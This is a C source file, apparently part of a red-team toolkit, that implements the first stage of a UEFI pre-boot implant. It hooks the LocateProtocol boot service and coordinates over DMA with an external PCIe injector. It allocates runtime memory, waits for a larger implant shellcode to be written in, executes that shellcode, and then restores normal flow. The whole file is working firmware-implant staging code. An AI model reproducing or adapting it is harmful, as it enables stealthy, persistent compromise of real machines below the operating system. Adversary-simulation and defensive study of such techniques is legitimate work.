/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef 
EFI_STATUS
( EFIAPI * STAGE_PTR )(
	EFI_SYSTEM_TABLE*
);

/*!
 *
 * Purpose:
 *
 * Intended to copy over a larger UEFI shellcode that will act as the core logic of the implant. 
 * Uses a DMA status for notifying an implant script of the various stages that occur to ensure
 * not failure occurs.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EntryStage_0( _In_ EFI_GUID *Protocol, PVOID Registration, PVOID* Interface )
{
	EFI_STATUS		Est = EFI_SUCCESS;

	STAGE_PTR		Stg = NULL;	
	PDMA_CONFIG		Dma = NULL;
	EFI_SYSTEM_TABLE*	Sys = NULL;
	EFI_PHYSICAL_ADDRESS	Adr = 0;

	/* Get the configuration from DMA */
	Dma = C_PTR( U_PTR( GetIp() ) + 11 );

	/* Set the original pointer for EFI_BOOT_SERVICES->LocateProtocol */
	Sys = C_PTR( Dma->EfiSystemTable );
	Sys->BootServices->LocateProtocol = C_PTR( Dma->LocateProtocol );

	/* Allocate the buffer for pcie_lib_helper!inject_efi_staged to insert */
	if ( ( Est = Sys->BootServices->AllocatePages( AllocateAnyPages, EfiRuntimeServicesData, ( ( ( Dma->EfiShellLength + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) ) / 0x1000 ), &Adr ) ) == EFI_SUCCESS ) 
	{
		/* Notify we are ready to be written to! */
		Dma->DmaStatus->ShellCode = U_PTR( Adr );
		Dma->DmaStatus->DmaStatus = DMA_STATUS_STAGE_1;
		_mm_clflush( &Dma->DmaStatus->ShellCode );
		_mm_clflush( &Dma->DmaStatus->DmaStatus );

		/* Wait for the status to be updated */
		while ( Dma->DmaStatus->DmaStatus != DMA_STATUS_STAGE_2 ) {
			/* Flush the cache status */
			_mm_clflush( & Dma->DmaStatus->DmaStatus );

			/* Restart the loop */
			continue;
		};

		/* Loop through and clear a 'line' */
		for ( INT Ofs = 0 ; Ofs < ( ( ( Dma->EfiShellLength + 0x1000 - 1 ) &~( 0x1000 - 1 ) ) / 64 ) ; Ofs += 64 ) {
			/* Clear the cache */
			_mm_clflush( C_PTR( U_PTR( Dma->DmaStatus->ShellCode ) + Ofs ) );

		};

		/* Setup the call! */
		Stg = C_PTR( Dma->DmaStatus->ShellCode );
		Est = Stg( Dma->EfiSystemTable );

		/* Notify we executed the payload */
		Dma->DmaStatus->ErrorCode = Est;
		Dma->DmaStatus->DmaStatus = DMA_STATUS_STAGE_3;
		_mm_clflush( &Dma->DmaStatus->ErrorCode );
		_mm_clflush( &Dma->DmaStatus->DmaStatus );

		while ( Dma->DmaStatus->DmaStatus != DMA_STATUS_STAGE_4 ) {
			/* Flush the cache status */
			_mm_clflush( & Dma->DmaStatus->DmaStatus );

			/* Restart the loop */
			continue;
		};
	};

	/* Call the original pointer */
	return Sys->BootServices->LocateProtocol( Protocol, Registration, Interface );
};
